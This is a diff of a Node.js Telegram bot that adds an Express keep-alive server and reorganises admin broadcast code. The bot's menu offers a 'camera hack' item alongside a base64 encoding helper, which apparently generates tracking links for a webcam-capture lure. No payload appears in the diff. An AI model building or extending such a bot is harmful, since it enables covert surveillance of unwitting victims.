@@ -1,7 +1,17 @@
 const TelegramBot = require('node-telegram-bot-api');
-const token = process.env.BOT_TOKEN;
-const bot = new TelegramBot(token, { polling: true });
+const express = require('express');
+const fs = require('fs');
 
+// Environment variables
+const token = process.env.BOT_TOKEN;
+const ADMIN_ID = process.env.ADMIN_ID;
+const PORT = process.env.PORT || 4000;
+
+// Initialize bot and express app
+const bot = new TelegramBot(token, { polling: true });
+const app = express();
+
+// Data for bot
 const linkData = [
   {
     name: "📷 camera hack 📷",
@@ -13,6 +23,7 @@ const linkData = [
   }
 ];
 
+// Utility functions
 function encodeBase64(text) {
   return Buffer.from(text.toString()).toString('base64');
 }
@@ -20,8 +31,6 @@ function encodeBase64(text) {
 function generateMainMenu() {
   return linkData.map(item => ({ text: item.name, callback_data: `menu_${item.name}` }));
 }
-
-const fs = require('fs');
 
 function saveChatId(chatId) {
   try {
@@ -37,6 +46,7 @@ function saveChatId(chatId) {
   }
 }
 
+// Bot commands
 bot.onText(/\/start/, async (msg) => {
   const chatId = msg.chat.id;
   saveChatId(chatId);
@@ -75,13 +85,9 @@ bot.on('callback_query', async (callbackQuery) => {
   }
 });
 
-//To store broadcast states. Needs to be initialized before use.
+// Admin commands
 const broadcastStates = new Map();
 
-// Admin configuration
-const ADMIN_ID = process.env.ADMIN_ID;
-
-// Admin commands
 bot.onText(/\/admin/, async (msg) => {
   const chatId = msg.chat.id;
   if (chatId.toString() === ADMIN_ID) {
@@ -98,7 +104,6 @@ bot.onText(/\/admin/, async (msg) => {
   }
 });
 
-// Enhanced callback handling
 bot.on('callback_query', async (callbackQuery) => {
   const chatId = callbackQuery.message.chat.id;
   const data = callbackQuery.data;
@@ -112,14 +117,8 @@ bot.on('callback_query', async (callbackQuery) => {
       await bot.sendMessage(chatId, '📢 Send your broadcast message (text, image or video):');
     }
   }
-
-  // Existing callback handling
-  if (data.startsWith('menu_')) {
-    // ... existing code ...
-  }
 });
 
-// Enhanced message handling
 bot.on('message', async (msg) => {
   const chatId = msg.chat.id;
 
@@ -147,4 +146,13 @@ bot.on('message', async (msg) => {
 
     await bot.sendMessage(chatId, `📢 Broadcast completed!\nSuccess: ${successCount}\nFailed: ${failCount}`);
   }
+});
+
+// Express server
+app.get('/', (req, res) => {
+  res.send('Bot is running!');
+});
+
+app.listen(PORT, () => {
+  console.log(`Server is running on port ${PORT}`);
 });
